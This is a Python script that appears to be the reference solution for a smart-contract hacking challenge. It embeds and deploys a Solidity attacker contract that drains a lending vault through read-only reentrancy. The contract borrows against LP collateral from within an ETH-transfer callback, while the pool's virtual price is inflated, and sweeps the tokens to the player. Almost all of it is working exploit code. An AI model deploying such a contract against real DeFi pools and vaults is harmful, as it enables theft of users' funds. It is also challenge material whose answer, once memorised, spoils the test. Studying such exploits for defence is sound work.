#!/usr/bin/env python3
"""Reference exploit — must drain the vault to the player (harness exit test).

Writes and deploys an attacker contract that: adds dominating liquidity to the
pool, deposits a sliver of LP as collateral in the vault, then calls
remove_liquidity on the rest — and, from inside the ETH-transfer callback
(when get_virtual_price is inflated because totalSupply already dropped but the
reserves have not), borrows the vault's tokens against the temporarily
overvalued collateral. Loot is swept to the player.
"""
import json
import subprocess
import sys
from pathlib import Path

ATTACKER_SRC = r"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
interface IPool { function lp() external view returns(address); function add_liquidity(uint256) external payable returns(uint256); function remove_liquidity(uint256) external; function get_virtual_price() external view returns(uint256); }
interface IVault { function depositCollateral(uint256) external; function borrow(uint256) external; function cf() external view returns(uint256); function collateral(address) external view returns(uint256); }
interface IERC { function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); function transfer(address,uint256) external returns(bool); }
contract Attacker {
    IPool pool; IVault vault; IERC token; IERC lp; address owner;
    constructor(address _p,address _v,address _t){ pool=IPool(_p); vault=IVault(_v); token=IERC(_t); lp=IERC(pool.lp()); owner=msg.sender; }
    function attack(uint256 addEth,uint256 addTok,uint256 collat) external payable {
        token.approve(address(pool), type(uint256).max);
        uint256 got = pool.add_liquidity{value:addEth}(addTok);
        lp.approve(address(vault), type(uint256).max);
        vault.depositCollateral(collat);
        pool.remove_liquidity(got - collat);      // -> receive() borrows at inflated vp
        token.transfer(owner, token.balanceOf(address(this)));
    }
    receive() external payable {
        uint256 col = vault.collateral(address(this));
        if (col == 0) return;
        uint256 limit = col * pool.get_virtual_price() / 1e18 * vault.cf() / 1e18;
        uint256 avail = token.balanceOf(address(vault));
        uint256 grab = limit < avail ? limit : avail;
        if (grab > 0) vault.borrow(grab);
    }
}
"""


def cast(*args):
    p = subprocess.run(["cast", *args], capture_output=True, text=True, timeout=120)
    return p.stdout.strip().split()[0] if p.returncode == 0 else None


def main():
    p = json.loads(Path("params.json").read_text())
    rpc = p["rpc_url"]
    key = Path(p["key_file"]).read_text().strip()

    Path("src/Attacker.sol").write_text(ATTACKER_SRC)
    if subprocess.run(["forge", "build"], capture_output=True, text=True).returncode != 0:
        sys.exit("forge build failed")
    code = json.loads(Path("out/Attacker.sol/Attacker.json").read_text())["bytecode"]["object"]

    def pad(a):
        return a.lower().replace("0x", "").rjust(64, "0")

    creation = code + pad(p["pool"]) + pad(p["vault"]) + pad(p["token"])
    out = subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key,
                          "--create", creation, "--json"], capture_output=True, text=True)
    atk = json.loads(out.stdout)["contractAddress"]

    # fund the attacker with the player's full ETH + Token working capital
    # (a bigger liquidity add means a bigger invariant D and a bigger borrow cap)
    add_eth = p["player_eth_wei"]
    add_tok = p["player_tokens_wei"]
    subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, atk,
                    "--value", str(add_eth)], capture_output=True, text=True)
    subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, p["token"],
                    "transfer(address,uint256)", atk, str(add_tok)], capture_output=True, text=True)

    # collateral: small vs our LP (so removing the rest still spikes the price),
    # but large enough that limit = collat * inflated_vp * cf exceeds the vault
    collat = 200 * 10**18
    subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, atk,
                    "attack(uint256,uint256,uint256)", str(add_eth), str(add_tok), str(collat)],
                   capture_output=True, text=True)
    print("ran read-only reentrancy attack")


if __name__ == "__main__":
    main()
